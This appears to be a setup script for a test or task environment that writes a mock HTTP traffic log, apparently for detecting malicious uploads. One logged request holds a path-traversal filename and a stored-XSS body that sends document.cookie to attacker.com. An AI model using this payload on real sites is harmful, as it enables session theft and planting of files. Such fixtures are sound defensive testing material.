#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
apt-get update && apt-get install -y python3 python3-pip
pip3 install pytest

useradd -m -s /bin/bash user || true

cat << 'EOF' > /home/user/traffic.json
[
  {
    "method": "POST",
    "endpoint": "/upload",
    "headers": {
      "Content-Type": "text/plain",
      "Content-Disposition": "form-data; name=\"file\"; filename=\"profile.jpg\""
    },
    "body": "binarydata_jpg_mock"
  },
  {
    "method": "POST",
    "endpoint": "/upload",
    "headers": {
      "Content-Type": "text/html",
      "Content-Disposition": "form-data; name=\"file\"; filename=\"../../../var/www/html/stored_xss.html\""
    },
    "body": "<html><body><script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script></body></html>"
  },
  {
    "method": "GET",
    "endpoint": "/health",
    "headers": {
      "User-Agent": "Mozilla/5.0"
    },
    "body": ""
  }
]
EOF

chmod -R 777 /home/user
